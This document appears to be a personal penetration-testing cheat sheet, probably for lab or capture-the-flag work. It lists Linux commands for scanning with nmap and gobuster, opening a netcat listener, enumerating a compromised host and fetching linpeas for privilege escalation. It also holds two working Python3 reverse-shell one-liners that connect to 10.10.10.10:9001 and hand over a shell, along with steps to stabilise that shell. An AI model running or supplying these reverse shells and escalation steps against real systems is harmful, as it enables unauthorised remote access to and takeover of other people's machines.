# Accessing website or application through linux
curl <server-ip>

# Network Mapper to find open ports and services
nmap <server-ip>

# SSH to server
ssh username@server

# gobuster for directory enum
gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>

# Search recurively through directories finding any character match
grep -R .

# Start listening for connection on port 9999
nc -lvnp 9999

# Find the ip address of your main nic
ip addr show eth0

# Reverse Shell with Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# Returns the hostname of the machine, it can provide information about the target system's role within the network
hostname

# Provides details about the kernel, which is useful in searching for a kernel exploit
uname -a

# Provides information on the kernel version and whether a compiler is installed or not GCC for instance
cat /proc/version

# Can contain info on the OS
cat /etc/issue

# All running processes
ps -A
ps aux

# Shows the list of commands the user is allowed to run as a root user.
sudo -l

# Show all files and directories, including hidden ones
ls -la

# Provide the information on the user's privilege level and the groups that the user is in.
id

# When pivoting, the ifconfig command provides information on the available network interfaces of the system.
ifconfig

# Stablizing Netcat shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background the Netcat shell using CTRL+Z
# Back in your own terminal type “stty raw -echo; fg”

# Linpeas is a script for enumerating all possible directories for privilege escalation
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh







